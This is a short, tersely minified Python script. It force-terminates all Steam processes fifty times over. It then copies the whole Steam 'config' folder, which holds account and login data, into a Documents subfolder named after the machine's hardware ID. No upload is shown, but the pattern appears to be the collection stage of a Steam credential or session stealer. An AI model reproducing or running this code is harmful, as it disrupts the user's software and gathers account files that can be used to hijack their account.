import os,shutil,uuid,time,psutil,psutil,time
process_names={'steam.exe','steamwebhelper.exe','steamservice.exe','SteamClient.exe'}
def kill_process_by_name(process_name):
	'Kill all processes matching the given process name.';D='name';C='pid';A=process_name
	for B in psutil.process_iter(attrs=[C,D]):
		if B.info[D].lower()==A.lower():
			try:psutil.Process(B.info[C]).terminate();print(f"Terminated process: {A} (PID: {B.info[C]})")
			except psutil.NoSuchProcess:print(f"Process {A} no longer exists.")
			except psutil.AccessDenied:print(f"Access denied to terminate {A}.")
			except Exception as E:print(f"Error terminating {A}: {E}")
def kill_specified_processes(processes):
	'Kill all specified processes from the given set.'
	for A in processes:kill_process_by_name(A)
for _ in range(50):print('Attempting to terminate processes...');kill_specified_processes(process_names)
def get_hw_id():A=uuid.getnode();return A
def copy_steam_config():
	D='Steam';A=os.path.join('C:\\','Program Files (x86)',D,'config');E=os.path.join('C:\\Users',os.getlogin(),'Documents');F=get_hw_id();G=str(F);H=os.path.join(E,G);B=os.path.join(H,D);os.makedirs(B,exist_ok=True)
	if not os.path.exists(A):print(f"The Steam config path {A} does not exist.");return
	for I in os.listdir(A):
		C=os.path.join(A,I)
		if os.path.isfile(C):shutil.copy(C,B)
	print(f"All files from {A} have been copied to {B}.")
copy_steam_config()